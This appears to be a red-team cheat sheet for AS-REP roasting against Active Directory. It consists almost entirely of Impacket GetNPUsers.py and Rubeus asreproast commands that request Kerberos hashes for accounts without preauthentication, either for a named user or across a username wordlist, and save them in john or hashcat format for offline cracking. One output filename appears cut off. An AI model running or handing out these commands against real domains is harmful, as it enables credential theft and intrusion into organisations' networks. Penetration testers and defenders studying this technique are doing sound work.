# Requires kerberos preauthentication being disabled

```
# Single User
GetNPUsers.py DOMAIN.com/USER -dc-ip DOMAIN.com -request -format john  -outputfile hashes_john.txt  
  
or   
  
GetNPUsers.py DOMAIN.com/USER -dc-ip DOMAIN.com -request -format hashcat  -outputfile hashes_hashcat.txt
```

# Check users file  
  
```
GetNPUsers.py DOMAIN.com/ -dc-ip DOMAIN.com -usersfile /root/redteam/wordlists/usernames/A-ZSurnames.txt -request -format john -outputfile hashes_john.txt  
  
or  
  
GetNPUsers.py DOMAIN.com/ -dc-ip DOMAIN.com -usersfile /root/redteam/wordlists/usernames/A-ZSurnames.txt -request -format hashcat -outputfile hashes_hash
```

# Rubeus
```
.\Rubeus.exe asreproast  /format:john /outfile:asreproast_john.txt  
  
.\Rubeus.exe asreproast  /format:hashcat /outfile:asreproast_hashcat.txt
```